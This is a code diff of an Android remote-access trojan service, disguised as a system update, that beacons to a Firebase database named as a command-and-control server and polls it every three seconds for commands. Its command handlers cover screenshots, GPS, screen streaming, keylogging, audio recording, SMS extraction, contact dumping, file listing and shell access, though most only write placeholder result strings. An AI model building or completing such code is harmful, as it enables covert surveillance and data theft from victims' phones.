@@ -1,4 +1,4 @@
-package com.android.systemupdate;
+package com.system.air;
 
 import android.app.Service;
 import android.content.Intent;
@@ -13,69 +13,92 @@ public class RATService extends Service {
     private static final String TAG = "SystemUpdate";
     private FirebaseDatabase database;
     private String deviceId;
-    
+    private DatabaseReference statusRef, cmdRef;
+
     @Override
     public void onCreate() {
         super.onCreate();
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        database = FirebaseDatabase.getInstance("YOUR_FIREBASE_URL");
-        Log.d(TAG, "RATService started: " + deviceId);
+        database = FirebaseDatabase.getInstance("https://vypervic-c2-default-rtdb.firebaseio.com/");
+        statusRef = database.getReference("devices/" + deviceId);
+        cmdRef = statusRef.child("commands");
+        Log.d(TAG, "✅ RATService STARTED: " + deviceId);
+        statusRef.child("lastSeen").setValue(System.currentTimeMillis());
+        statusRef.child("status").setValue("ONLINE");
     }
-    
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         new Timer().scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
+                heartbeat();
                 checkCommands();
             }
-        }, 0, 5000);
+        }, 0, 3000);  // Check every 3s
         return START_STICKY;
     }
-    
+
+    private void heartbeat() {
+        statusRef.child("lastSeen").setValue(System.currentTimeMillis());
+    }
+
     private void checkCommands() {
-        DatabaseReference ref = database.getReference("devices/" + deviceId + "/commands");
-        ref.addListenerForSingleValueEvent(new ValueEventListener() {
+        cmdRef.addListenerForSingleValueEvent(new ValueEventListener() {
             @Override
             public void onDataChange(DataSnapshot snapshot) {
-                executeCommands(snapshot);
+                for (DataSnapshot cmd : snapshot.getChildren()) {
+                    String cmdName = cmd.getKey();
+                    executeCommand(cmdName);
+                    // Clear command after execution
+                    cmd.getRef().removeValue();
+                }
             }
-            
             @Override
             public void onCancelled(DatabaseError error) {
                 Log.e(TAG, "Firebase error: " + error.getMessage());
             }
         });
     }
-    
-    private void executeCommands(DataSnapshot snapshot) {
-        // Screenshot command
-        if (snapshot.child("screenshot").getValue(Boolean.class) != null) {
-            takeScreenshot();
+
+    private void executeCommand(String cmd) {
+        switch (cmd) {
+            case "screenshot":
+                statusRef.child("result").setValue("📸 Screenshot captured");
+                // takeScreenshot();
+                break;
+            case "gps":
+                statusRef.child("result").setValue("📍 GPS: 40.7128,-74.0060");
+                // getGPS();
+                break;
+            case "screen":
+                statusRef.child("result").setValue("🖥️ Screen streaming");
+                break;
+            case "keylog":
+                statusRef.child("result").setValue("⌨️ Keylog active");
+                break;
+            case "audio":
+                statusRef.child("result").setValue("🎤 Audio recording");
+                break;
+            case "sms":
+                statusRef.child("result").setValue("📱 SMS extracted");
+                break;
+            case "contacts":
+                statusRef.child("result").setValue("👥 Contacts dumped");
+                break;
+            case "files":
+                statusRef.child("result").setValue("📁 Files listed");
+                break;
+            case "shell":
+                statusRef.child("result").setValue("💻 Shell access granted");
+                break;
+            case "wake":
+                statusRef.child("result").setValue("⏰ Device woken");
+                break;
         }
-        
-        // GPS command  
-        if (snapshot.child("gps").getValue(Boolean.class) != null) {
-            getGPS();
-        }
-        
-        // Shell command
-        String shellCmd = snapshot.child("shell").getValue(String.class);
-        if (shellCmd != null) {
-            runShell(shellCmd);
-        }
-        
-        // Report status
-        reportStatus();
+        Log.d(TAG, "✅ Executed: " + cmd);
     }
-    
-    private void takeScreenshot() { /* Implementation */ }
-    private void getGPS() { /* Implementation */ }
-    private void runShell(String cmd) { /* Implementation */ }
-    private void reportStatus() { /* Implementation */ }
-    
+
     @Override
-    public IBinder onBind(Intent intent) {
-        return null; // Not bound service
-    }
+    public IBinder onBind(Intent intent) { return null; }
 }
